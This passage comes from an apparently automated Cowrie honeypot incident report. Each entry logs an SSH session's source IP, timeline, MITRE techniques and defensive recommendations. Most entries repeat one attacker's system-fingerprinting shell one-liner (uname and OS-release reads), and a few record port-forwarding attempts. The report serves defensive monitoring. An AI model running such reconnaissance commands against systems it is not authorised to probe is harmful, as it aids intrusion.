| `2026-08-03 22:02:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e75f8738913

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:04 |
| **Last Seen** | 2026-08-03 22:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:04:34` | `cowrie.session.connect` |
| `2026-08-03 22:04:34` | `cowrie.client.version` |
| `2026-08-03 22:04:34` | `cowrie.client.kex` |
| `2026-08-03 22:04:36` | `cowrie.login.success` |
| `2026-08-03 22:04:36` | `cowrie.session.params` |
| `2026-08-03 22:04:36` | `cowrie.command.input` |
| `2026-08-03 22:04:36` | `cowrie.command.input` |
| `2026-08-03 22:04:36` | `cowrie.command.input` |
| `2026-08-03 22:04:36` | `cowrie.command.input` |
| `2026-08-03 22:04:36` | `cowrie.command.input` |
| `2026-08-03 22:04:36` | `cowrie.command.success` |
| `2026-08-03 22:04:36` | `cowrie.command.input` |
| `2026-08-03 22:04:36` | `cowrie.command.input` |
| `2026-08-03 22:04:36` | `cowrie.command.input` |
| `2026-08-03 22:04:36` | `cowrie.command.input` |
| `2026-08-03 22:04:37` | `cowrie.log.closed` |
| `2026-08-03 22:04:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06dc7cf109e5

| Field | Detail |
|---|---|
| **Source IP** | `14.33.96[.]3` |
| **First Seen** | 2026-08-03 22:06 |
| **Last Seen** | 2026-08-03 22:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:06:28` | `cowrie.session.connect` |
| `2026-08-03 22:06:29` | `cowrie.client.version` |
| `2026-08-03 22:06:29` | `cowrie.client.kex` |
| `2026-08-03 22:06:30` | `cowrie.login.success` |
| `2026-08-03 22:06:31` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:06:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.96[.]3` to AbuseIPDB if not already reported
- [ ] Block `14.33.96[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6af5fe9936a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:06 |
| **Last Seen** | 2026-08-03 22:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:06:44` | `cowrie.session.connect` |
| `2026-08-03 22:06:44` | `cowrie.client.version` |
| `2026-08-03 22:06:44` | `cowrie.client.kex` |
| `2026-08-03 22:06:46` | `cowrie.login.success` |
| `2026-08-03 22:06:48` | `cowrie.session.params` |
| `2026-08-03 22:06:48` | `cowrie.command.input` |
| `2026-08-03 22:06:48` | `cowrie.command.input` |
| `2026-08-03 22:06:48` | `cowrie.command.input` |
| `2026-08-03 22:06:48` | `cowrie.command.input` |
| `2026-08-03 22:06:48` | `cowrie.command.input` |
| `2026-08-03 22:06:48` | `cowrie.command.success` |
| `2026-08-03 22:06:48` | `cowrie.command.input` |
| `2026-08-03 22:06:48` | `cowrie.command.input` |
| `2026-08-03 22:06:48` | `cowrie.command.input` |
| `2026-08-03 22:06:48` | `cowrie.command.input` |
| `2026-08-03 22:06:48` | `cowrie.log.closed` |
| `2026-08-03 22:06:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80c0ce40482f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:08 |
| **Last Seen** | 2026-08-03 22:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:08:53` | `cowrie.session.connect` |
| `2026-08-03 22:08:53` | `cowrie.client.version` |
| `2026-08-03 22:08:53` | `cowrie.client.kex` |
| `2026-08-03 22:08:55` | `cowrie.login.success` |
| `2026-08-03 22:08:57` | `cowrie.session.params` |
| `2026-08-03 22:08:57` | `cowrie.command.input` |
| `2026-08-03 22:08:57` | `cowrie.command.input` |
| `2026-08-03 22:08:57` | `cowrie.command.input` |
| `2026-08-03 22:08:57` | `cowrie.command.input` |
| `2026-08-03 22:08:57` | `cowrie.command.input` |
| `2026-08-03 22:08:57` | `cowrie.command.success` |
| `2026-08-03 22:08:57` | `cowrie.command.input` |
| `2026-08-03 22:08:57` | `cowrie.command.input` |
| `2026-08-03 22:08:57` | `cowrie.command.input` |
| `2026-08-03 22:08:57` | `cowrie.command.input` |
| `2026-08-03 22:08:59` | `cowrie.log.closed` |
| `2026-08-03 22:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed6bcd950bf8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:11 |
| **Last Seen** | 2026-08-03 22:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:11:03` | `cowrie.session.connect` |
| `2026-08-03 22:11:04` | `cowrie.client.version` |
| `2026-08-03 22:11:04` | `cowrie.client.kex` |
| `2026-08-03 22:11:05` | `cowrie.login.success` |
| `2026-08-03 22:11:06` | `cowrie.session.params` |
| `2026-08-03 22:11:06` | `cowrie.command.input` |
| `2026-08-03 22:11:06` | `cowrie.command.input` |
| `2026-08-03 22:11:06` | `cowrie.command.input` |
| `2026-08-03 22:11:06` | `cowrie.command.input` |
| `2026-08-03 22:11:06` | `cowrie.command.input` |
| `2026-08-03 22:11:07` | `cowrie.command.success` |
| `2026-08-03 22:11:07` | `cowrie.command.input` |
| `2026-08-03 22:11:07` | `cowrie.command.input` |
| `2026-08-03 22:11:07` | `cowrie.command.input` |
| `2026-08-03 22:11:07` | `cowrie.command.input` |
| `2026-08-03 22:11:07` | `cowrie.log.closed` |
| `2026-08-03 22:11:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f7f2a83830d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:13 |
| **Last Seen** | 2026-08-03 22:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:13:10` | `cowrie.session.connect` |
| `2026-08-03 22:13:10` | `cowrie.client.version` |
| `2026-08-03 22:13:10` | `cowrie.client.kex` |
| `2026-08-03 22:13:12` | `cowrie.login.success` |
| `2026-08-03 22:13:14` | `cowrie.session.params` |
| `2026-08-03 22:13:14` | `cowrie.command.input` |
| `2026-08-03 22:13:14` | `cowrie.command.input` |
| `2026-08-03 22:13:14` | `cowrie.command.input` |
| `2026-08-03 22:13:14` | `cowrie.command.input` |
| `2026-08-03 22:13:14` | `cowrie.command.input` |
| `2026-08-03 22:13:14` | `cowrie.command.success` |
| `2026-08-03 22:13:14` | `cowrie.command.input` |
| `2026-08-03 22:13:14` | `cowrie.command.input` |
| `2026-08-03 22:13:14` | `cowrie.command.input` |
| `2026-08-03 22:13:14` | `cowrie.command.input` |
| `2026-08-03 22:13:15` | `cowrie.log.closed` |
| `2026-08-03 22:13:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5039a6bd2598

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:15 |
| **Last Seen** | 2026-08-03 22:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:15:20` | `cowrie.session.connect` |
| `2026-08-03 22:15:20` | `cowrie.client.version` |
| `2026-08-03 22:15:20` | `cowrie.client.kex` |
| `2026-08-03 22:15:21` | `cowrie.login.success` |
| `2026-08-03 22:15:23` | `cowrie.session.params` |
| `2026-08-03 22:15:23` | `cowrie.command.input` |
| `2026-08-03 22:15:23` | `cowrie.command.input` |
| `2026-08-03 22:15:23` | `cowrie.command.input` |
| `2026-08-03 22:15:23` | `cowrie.command.input` |
| `2026-08-03 22:15:23` | `cowrie.command.input` |
| `2026-08-03 22:15:23` | `cowrie.command.success` |
| `2026-08-03 22:15:23` | `cowrie.command.input` |
| `2026-08-03 22:15:23` | `cowrie.command.input` |
| `2026-08-03 22:15:23` | `cowrie.command.input` |
| `2026-08-03 22:15:23` | `cowrie.command.input` |
| `2026-08-03 22:15:23` | `cowrie.log.closed` |
| `2026-08-03 22:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e42fabcf25de

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:17 |
| **Last Seen** | 2026-08-03 22:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:17:34` | `cowrie.session.connect` |
| `2026-08-03 22:17:35` | `cowrie.client.version` |
| `2026-08-03 22:17:35` | `cowrie.client.kex` |
| `2026-08-03 22:17:38` | `cowrie.login.success` |
| `2026-08-03 22:17:39` | `cowrie.session.params` |
| `2026-08-03 22:17:39` | `cowrie.command.input` |
| `2026-08-03 22:17:39` | `cowrie.command.input` |
| `2026-08-03 22:17:39` | `cowrie.command.input` |
| `2026-08-03 22:17:39` | `cowrie.command.input` |
| `2026-08-03 22:17:39` | `cowrie.command.input` |
| `2026-08-03 22:17:39` | `cowrie.command.success` |
| `2026-08-03 22:17:39` | `cowrie.command.input` |
| `2026-08-03 22:17:39` | `cowrie.command.input` |
| `2026-08-03 22:17:39` | `cowrie.command.input` |
| `2026-08-03 22:17:39` | `cowrie.command.input` |
| `2026-08-03 22:17:40` | `cowrie.log.closed` |
| `2026-08-03 22:17:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f845d732a20b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:20 |
| **Last Seen** | 2026-08-03 22:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:20:08` | `cowrie.session.connect` |
| `2026-08-03 22:20:08` | `cowrie.client.version` |
| `2026-08-03 22:20:08` | `cowrie.client.kex` |
| `2026-08-03 22:20:11` | `cowrie.login.success` |
| `2026-08-03 22:20:13` | `cowrie.session.params` |
| `2026-08-03 22:20:13` | `cowrie.command.input` |
| `2026-08-03 22:20:13` | `cowrie.command.input` |
| `2026-08-03 22:20:13` | `cowrie.command.input` |
| `2026-08-03 22:20:13` | `cowrie.command.input` |
| `2026-08-03 22:20:13` | `cowrie.command.input` |
| `2026-08-03 22:20:13` | `cowrie.command.success` |
| `2026-08-03 22:20:13` | `cowrie.command.input` |
| `2026-08-03 22:20:13` | `cowrie.command.input` |
| `2026-08-03 22:20:13` | `cowrie.command.input` |
| `2026-08-03 22:20:13` | `cowrie.command.input` |
| `2026-08-03 22:20:13` | `cowrie.log.closed` |
| `2026-08-03 22:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bb2be588b7e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:22 |
| **Last Seen** | 2026-08-03 22:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:22:33` | `cowrie.session.connect` |
| `2026-08-03 22:22:34` | `cowrie.client.version` |
| `2026-08-03 22:22:34` | `cowrie.client.kex` |
| `2026-08-03 22:22:36` | `cowrie.login.success` |
| `2026-08-03 22:22:37` | `cowrie.session.params` |
| `2026-08-03 22:22:37` | `cowrie.command.input` |
| `2026-08-03 22:22:37` | `cowrie.command.input` |
| `2026-08-03 22:22:37` | `cowrie.command.input` |
| `2026-08-03 22:22:37` | `cowrie.command.input` |
| `2026-08-03 22:22:37` | `cowrie.command.input` |
| `2026-08-03 22:22:37` | `cowrie.command.success` |
| `2026-08-03 22:22:37` | `cowrie.command.input` |
| `2026-08-03 22:22:37` | `cowrie.command.input` |
| `2026-08-03 22:22:37` | `cowrie.command.input` |
| `2026-08-03 22:22:38` | `cowrie.command.input` |
| `2026-08-03 22:22:38` | `cowrie.log.closed` |
| `2026-08-03 22:22:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc10b50ae7d4

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-08-03 22:24 |
| **Last Seen** | 2026-08-03 22:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:24:25` | `cowrie.session.connect` |
| `2026-08-03 22:24:25` | `cowrie.client.version` |
| `2026-08-03 22:24:25` | `cowrie.client.kex` |
| `2026-08-03 22:24:28` | `cowrie.login.success` |
| `2026-08-03 22:24:28` | `cowrie.direct-tcpip.request` |
| `2026-08-03 22:24:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e05211bb51ae

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:25 |
| **Last Seen** | 2026-08-03 22:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:25:04` | `cowrie.session.connect` |
| `2026-08-03 22:25:04` | `cowrie.client.version` |
| `2026-08-03 22:25:04` | `cowrie.client.kex` |
| `2026-08-03 22:25:07` | `cowrie.login.success` |
| `2026-08-03 22:25:09` | `cowrie.session.params` |
| `2026-08-03 22:25:09` | `cowrie.command.input` |
| `2026-08-03 22:25:09` | `cowrie.command.input` |
| `2026-08-03 22:25:09` | `cowrie.command.input` |
| `2026-08-03 22:25:09` | `cowrie.command.input` |
| `2026-08-03 22:25:09` | `cowrie.command.input` |
| `2026-08-03 22:25:09` | `cowrie.command.success` |
| `2026-08-03 22:25:09` | `cowrie.command.input` |
| `2026-08-03 22:25:09` | `cowrie.command.input` |
| `2026-08-03 22:25:09` | `cowrie.command.input` |
| `2026-08-03 22:25:09` | `cowrie.command.input` |
| `2026-08-03 22:25:09` | `cowrie.log.closed` |
| `2026-08-03 22:25:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d2acb0dcb22

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-03 22:27 |
| **Last Seen** | 2026-08-03 22:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 22:27:31` | `cowrie.session.connect` |
| `2026-08-03 22:27:32` | `cowrie.client.version` |
| `2026-08-03 22:27:32` | `cowrie.client.kex` |
| `2026-08-03 22:27:34` | `cowrie.login.success` |
| `2026-08-03 22:27:36` | `cowrie.session.params` |
| `2026-08-03 22:27:36` | `cowrie.command.input` |
| `2026-08-03 22:27:36` | `cowrie.command.input` |
| `2026-08-03 22:27:36` | `cowrie.command.input` |
| `2026-08-03 22:27:36` | `cowrie.command.input` |
| `2026-08-03 22:27:36` | `cowrie.command.input` |
| `2026-08-03 22:27:36` | `cowrie.command.success` |
| `2026-08-03 22:27:36` | `cowrie.command.input` |
| `2026-08-03 22:27:36` | `cowrie.command.input` |
| `2026-08-03 22:27:36` | `cowrie.command.input` |
| `2026-08-03 22:27:36` | `cowrie.command.input` |
| `2026-08-03 22:27:36` | `cowrie.log.closed` |
| `2026-08-03 22:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5ad51c5224d

| Field | Detail |
